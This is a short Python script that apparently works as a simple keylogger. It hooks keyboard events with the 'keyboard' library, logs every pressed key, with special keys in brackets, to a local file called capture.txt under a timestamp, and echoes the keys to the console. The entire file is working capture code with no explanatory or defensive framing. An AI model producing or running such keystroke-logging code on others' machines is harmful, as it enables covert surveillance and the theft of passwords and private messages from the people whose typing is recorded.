import keyboard
import os
import datetime

specialKeys = ["space", "enter", "shift", "ctrl", "alt", "backspace", "esc"]

def includeDate():
	if os.path.isfile("capture.txt"):
		with open("capture.txt", "a") as arq:
			arq.write("\n"+datetime.datetime.now().strftime("%d/%m/%Y, %H:%M:%S")+"\n")
	else:
		with open("capture.txt", "w") as arq:
			arq.write("\n"+datetime.datetime.now().strftime("%d/%m/%Y, %H:%M:%S")+"\n")

def saveEvent(x):
	with open("capture.txt", "a") as arq:
		arq.write(x)

includeDate()
while True:
	event = keyboard.read_event()
	if event.event_type == 'down':
		print(event.name)
		if event.name in specialKeys:
			saveEvent(" ["+event.name+"] ")
		else:
			saveEvent(event.name)
